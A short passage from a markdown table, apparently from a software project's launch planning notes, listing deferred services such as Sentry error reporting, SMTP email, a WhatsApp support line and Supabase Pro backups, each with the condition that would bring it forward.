| Sentry DSN | Deferred; pre-activation task (#12) | Pilot activation |
| SMTP | Deferred; operator provisioning is used instead | Self-service password reset |
| WhatsApp API / support number | Deferred | — (no delivery is claimed) |
| Supabase Pro / PITR | Deferred | Paying customers or operational need |
